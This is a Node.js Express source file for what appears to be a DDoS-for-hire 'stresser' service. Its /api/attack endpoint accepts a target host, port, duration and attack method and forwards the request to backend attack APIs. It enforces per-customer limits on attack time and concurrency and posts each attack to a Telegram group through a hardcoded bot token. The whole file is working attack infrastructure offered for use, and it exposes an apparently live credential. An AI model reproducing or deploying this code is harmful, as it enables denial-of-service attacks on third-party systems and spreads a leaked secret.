/*
  Author: @Timetie
  Recorded / Fixed : @Fietz
  
  Contact Telegram : @lowtofast
*/

const express = require('express');
const app = express();
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios')
const configs = require('./users.json') //Setting For You Add Or Deleted User
    const apis = require('./apis.json'); // Add Your Api

const bot = new TelegramBot('6867741246:AAH7i76Sv18f6XjG0tLz2xUnA2545uqt_D0', { polling: true }); // Enter Key Bot For Hook Telegram
const MAX_REQUESTS = configs.maxConcurrentAttacks; //Maximum limit of attack requests within a certain time period
const TIME_WINDOW = 60000; //Time window in milliseconds (e.g. 1 minute = 60000 ms)

const requestCount = {}; //DATABSE
const requestTimestamps = {}; //DATABASE
const activeAttacks = {};

app.get('/api/attack', (req, res) => {
    const { username, key, host, port, time, method } = req.query;
  
    if (!username || !key || !host || !port || !time || !method) {
  res.json({ 
error: true, 
reason: 'Please verify all fields.' 
});
      return;
    }
 
 const nameNotFound = configs[username];
    const apiNotFound = configs[key];
    const links = apis[method];
    
    const currentTime = new Date().getTime();
const lastRequestTime = requestTimestamps[apiNotFound];
  const activeAttacksForApiKey = activeAttacks[apiNotFound] || [];
  activeAttacksForApiKey.filter(
    (attack) => currentTime - attack.startTime < attack.duration
    );

	if (!nameNotFound) {
      res.json({ 
error: true, 
reason: 'Invalid Username.' 
});
      return;
    }

    if (!apiNotFound) {
      res.json({ 
error: true, 
reason: 'Invalid Key.' 
});
      return;
    }

    if (!links) {
      res.json({ 
error: true, 
reason: 'Invalid method.' 
});
      return;
    }
    
    if (lastRequestTime && currentTime - lastRequestTime < TIME_WINDOW) {
  requestCount[apiNotFound] = (requestCount[apiNotFound] || 0) + 1;
  if (requestCount[apiNotFound] > apiNotFound.maxConcurrentAttacks) {
   console.log(`[SPAM] detected On User ${name}`)
    res.json({ error: true, reason: 'Too many requests. Please try again 1 minute later.' });
    return;
  }
} else {
  requestCount[apiNotFound] = 1;
}
requestTimestamps[apiNotFound] = currentTime;

if (apiNotFound.maxAttackTime < parseInt(time)) {
  res.json({ 
error: true, 
reason: 'Attack time exceeds limit.' 
});
  return;
}
if (apiNotFound.maxConcurrentAttacks <= activeAttacksForApiKey.length) {
  res.json({ 
error: true, 
reason: 'Concurrent attacks limit exceeded.' 
});
  return;
}
    
    if (apiNotFound.powersaving) {
const existingAttack = activeAttacksForApiKey.find(
      (attack) => attack.target === host
    );
    if (existingAttack)
      return res.json({ 
error: true, 
reason: 'An attack on this target is already in progress.' 
});
  }
  
  activeAttacksForApiKey.push({
    startTime: currentTime,
    duration: parseInt(time    * 1000),
    target: host,
  });

  activeAttacks[key] = activeAttacksForApiKey;
  
  const sendTelegramMessageToGroup = (groupId, message) => {
  bot.sendMessage(groupId, message);
};
    const requests = links.map((link) => {
      const apiUrl = link.replace('[host]', host).replace('[port]', port).replace('[time]', time);
      return axios.get(apiUrl);
    });
    
    Promise.all(requests)
      .then((responses) => {
        const data = responses.map((response) => response.data);
        sendTelegramMessageToGroup('-1002043673730', `New Attacks From
**Username**
${username}

**Hitting**
**__Target:__** ${host}
**__Port:__** ${port}
**__Time__** ${time}
**__Concurrents:__** ${apiNotFound.maxConcurrentAttacks}

**Logs**
{ 
success: true, 
reason: 'Attack sent successfully.' 
}`);
        console.log(`[Sent] ${username} || Host ${host} || Port ${port} || Time ${time} || Method ${method} `);
        res.json({ 
success: true, 
reason: 'Attack sent successfully.' 
});
      })
      .catch((error) => {
        console.error(error);
        res.json({ error: true, reason: `failed to connect to server, check console!` });
      });
  
});

// 404 Error
app.use(function(req, res) {
  res.status(404).json({
      error: 'true', reason: 'currently page is not found'
  });
});

// Running Application
app.listen("3000", () => {
	const sendTelegramMessageToGroup = (groupId, message) => {
  bot.sendMessage(groupId, message);
};
  console.log(`--------Fietz 0.1-------------
  [Information] Loaded apis.json
  [Information] Loaded users.json
  [Information] Loaded Database
  [Information] Loaded Telegram WebHook
  [Information] Bugs ? Contact Telegram @lowtofast
Api Servers Fietz Has Running On Port 3000

==============ATTACKS LOGS==============`);
sendTelegramMessageToGroup('-1002043673730', `Api Servers Hash Started`);
});
